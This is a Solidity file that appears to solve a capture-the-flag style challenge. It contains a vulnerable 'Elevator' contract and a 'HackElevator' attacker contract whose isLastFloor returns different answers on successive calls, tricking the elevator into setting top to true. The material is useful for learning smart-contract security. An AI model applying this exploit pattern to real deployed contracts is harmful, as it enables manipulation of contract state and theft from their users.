// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract HackElevator is Building {
    Elevator smartContract;

    function hackElevator(address _elevator) public {
        smartContract = Elevator(_elevator);

        smartContract.goTo(101);
    }

    function isLastFloor(uint256) external returns (bool) {
        return smartContract.floor() == 101 ? true : false;
    }
}
